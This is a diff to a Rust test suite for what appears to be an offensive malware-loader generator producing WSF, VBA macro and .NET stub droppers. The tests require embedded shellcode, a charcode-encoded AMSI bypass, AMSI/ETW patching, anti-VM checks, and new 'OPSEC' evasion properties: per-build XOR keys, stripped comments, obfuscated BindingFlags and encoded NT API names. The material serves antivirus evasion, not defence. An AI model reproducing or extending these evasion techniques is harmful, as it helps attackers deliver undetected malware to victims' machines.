@@ -10,6 +10,8 @@ fn base_config(t: LoaderType) -> LoaderConfig {
         iv_hex: "0011223344556677".into(),
         pe_config: None,
         appdomain_config: None,
+        wsf_stub_config: None,
+        dotnet_stub_hex: None,
     }
 }
 
@@ -18,9 +20,9 @@ fn base_config(t: LoaderType) -> LoaderConfig {
 #[test]
 fn wsf_renders_with_amsi_bypass() {
     let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
-    // AMSI bypass present via charcode array (not plaintext string)
-    assert!(src.contains("amsiInitFailed") || src.contains("Array(") || src.contains("36)"),
-        "WSF must contain AMSI bypass");
+    // amsiInitFailed charcode: 97,109,115,105 = 'a','m','s','i'
+    assert!(src.contains("97,109,115,105") || src.contains("SetValue(null, true)"),
+        "WSF must contain AMSI bypass via charcode-encoded field name");
     assert!(src.contains("fc4883e4f0"), "shellcode must be embedded");
 }
 
@@ -228,6 +230,63 @@ fn vba_excel_no_rwx() {
     assert!(src.contains("&H04"), "Excel VBA must allocate shellcode memory as RW (&H04)");
     assert!(src.contains("&H20"), "Excel VBA must VirtualProtect to PAGE_EXECUTE_READ (&H20)");
     // &H40 appears in the AMSI/ETW patching section (temporary RWX for byte patching) — that is expected.
+}
+
+// ── VBA: OPSEC regressions ────────────────────────────────────────────────────
+
+#[test]
+fn vba_word_no_hardcoded_comments() {
+    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
+    assert!(!src.contains("' Record cursor"), "hardcoded cursor comment in VBA output");
+    assert!(!src.contains("' Execution delay"), "hardcoded sandbox-timing comment in VBA output");
+    assert!(!src.contains("' VM/hypervisor"), "hardcoded VM comment in VBA output");
+}
+
+#[test]
+fn vba_two_builds_produce_different_registry_arrays() {
+    let src1 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
+    let src2 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
+    // Registry XOR key differs per build → the encoded integer sequence differs
+    let find_vmcodes_line = |s: &str| -> String {
+        s.lines().find(|l| l.contains("vmCodes(0)=")).unwrap_or("").to_string()
+    };
+    assert_ne!(find_vmcodes_line(&src1), find_vmcodes_line(&src2),
+        "VBA registry arrays must differ between builds (per-build XOR key)");
+}
+
+#[test]
+fn wsf_two_builds_produce_different_registry_arrays() {
+    let src1 = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
+    let src2 = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
+    // XOR key differs per build → encoded integer sequence differs
+    let find_vmr_line = |s: &str| -> String {
+        s.lines().find(|l| l.contains("_vmr=[")).unwrap_or("").to_string()
+    };
+    assert_ne!(find_vmr_line(&src1), find_vmr_line(&src2),
+        "WSF registry arrays must differ between builds (per-build XOR key)");
+}
+
+#[test]
+fn wsf_no_static_binding_flags_36() {
+    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
+    assert!(!src.contains("), 36)"), "literal BindingFlags 36 must not appear in WSF output");
+    assert!(src.contains("(4|32)"), "BindingFlags must be expressed as bitwise (4|32) not literal 36");
+}
+
+#[test]
+fn wsf_stub_source_renders() {
+    use template_engine::{generate_wsf_stub_source, WsfStubConfig};
+    let mut cfg = base_config(LoaderType::Wsf);
+    cfg.wsf_stub_config = Some(WsfStubConfig {
+        namespace: "xTestNs".into(),
+        type_name: "yTestClass".into(),
+    });
+    let src = generate_wsf_stub_source(&cfg).unwrap();
+    assert!(src.contains("xTestNs"), "stub must use provided namespace");
+    assert!(src.contains("yTestClass"), "stub must use provided type_name");
+    assert!(src.contains("public static void Run"), "stub must have Run method");
+    assert!(!src.contains("ntdll.dll"), "ntdll.dll must be charcode-encoded in stub");
+    assert!(!src.contains("NtAllocateVirtualMemory"), "NT function names must be charcode-encoded");
 }
 
 // ── C#: InstallUtil ──────────────────────────────────────────────────────────
